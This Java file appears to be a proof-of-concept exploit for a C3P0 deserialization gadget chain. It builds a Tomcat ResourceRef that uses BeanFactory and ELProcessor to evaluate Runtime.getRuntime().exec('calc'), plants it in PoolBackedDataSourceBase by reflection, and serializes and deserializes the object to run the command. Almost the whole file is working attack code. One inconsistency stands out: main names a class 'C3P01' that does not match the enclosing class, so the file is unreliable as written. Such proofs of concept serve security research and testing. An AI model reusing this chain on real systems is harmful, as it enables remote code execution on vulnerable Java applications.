package C3P0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class C3P0_Local {
    public static class C3P0 implements ConnectionPoolDataSource, Referenceable {

        @Override
        public Reference getReference() throws NamingException {
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String) null, "", "", true, "org.apache.naming.factory.BeanFactory", (String) null);
            resourceRef.add(new StringRefAddr("forceString", "faster=eval"));
            resourceRef.add(new StringRefAddr("faster", "Runtime.getRuntime().exec(\"calc\")"));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }


    public static void unserialize(byte[] bytes) throws Exception {
        try (ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
             ObjectInputStream oin = new ObjectInputStream(bain)) {
            oin.readObject();
        }
    }

    public static byte[] serialize(ConnectionPoolDataSource lp) throws Exception {
        PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
        Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
        connectionPoolDataSourceField.setAccessible(true);
        connectionPoolDataSourceField.set(poolBackedDataSourceBase, lp);


        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();
             ObjectOutputStream oout = new ObjectOutputStream(baout)) {
            oout.writeObject(poolBackedDataSourceBase);
            return baout.toByteArray();
        }

    }

    public static void main(String[] args) throws Exception {
        C3P01.C3P0 exp = new C3P01.C3P0();
        byte[] bytes = serialize(exp);
        unserialize(bytes);
    }
}